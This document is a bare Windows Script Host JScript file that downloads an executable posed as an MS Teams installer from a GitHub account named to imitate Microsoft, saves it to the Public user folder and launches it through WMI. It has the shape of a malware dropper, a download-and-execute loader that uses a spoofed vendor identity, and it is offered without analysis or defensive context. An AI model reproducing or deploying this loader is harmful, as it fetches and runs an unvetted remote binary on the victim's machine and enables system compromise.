var exeUrl = "https://github.com/MicrosoftSetuplab/Microsoft/raw/main/MSTeamsInstaller.exe";
var savePath = "C:\\Users\\Public\\setup.exe";

try {
    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("GET", exeUrl, false);
    xhr.send();

    if (xhr.status !== 200) {
        WScript.Echo("Download failed: " + xhr.status);
        WScript.Quit(1);
    }

    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1;
    stream.Open();
    stream.Write(xhr.ResponseBody);
    stream.SaveToFile(savePath, 2);
    stream.Close();

    var wmi = GetObject("winmgmts:Win32_Process");
    wmi.Create(savePath, null, null, null);

    WScript.Echo("Success.");
} catch (e) {
    WScript.Echo("Error: " + e.message);
    WScript.Quit(1);
}
